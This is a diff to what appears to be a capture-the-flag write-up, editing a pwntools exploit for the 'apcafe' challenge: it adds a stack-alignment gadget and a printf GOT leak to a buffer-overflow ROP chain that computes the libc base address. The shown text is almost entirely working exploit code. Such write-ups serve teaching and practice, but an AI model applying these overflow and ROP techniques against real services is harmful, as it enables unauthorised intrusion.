@@ -124,7 +124,6 @@ With the leak, we are able to finish our code and get the flag.
 
 
 ```py
-# coding: utf-8
 p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30101)  # connect to remote service
 context.binary = elf = ELF('apcafe')                          # provide the context to our pwntools
 libc = ELF('libc6_2.31-0ubuntu9_amd64.so')
@@ -133,15 +132,16 @@ payload = b'water\x00'                                        # put any string w
 payload += b"A" * (0x12 - len(payload))                       # pad up to 10+8 chracters to reach the return address
 
 rop = ROP(elf)                                                # set up our rop chain
+rop.call(rop.ret[0])                                          # stack alignment
 rop.puts(elf.got.puts)                                        # leak puts GOT
-#rop.puts(elf.got.printf)                                      # leak printf GOT
+rop.puts(elf.got.printf)                                      # leak printf GOT
 rop.main()
 p.sendline(payload + rop.chain())
 
 p.recvuntil(b"Sorry, we don't sell water...")
 p.recvline()
 puts = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))        # puts leak
-#printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))     # printf leak
+printf = u64(p.recvline().rstrip(b'\n').ljust(8, b'\x00'))     # printf leak
 
 libc.address = puts - libc.sym.puts
 
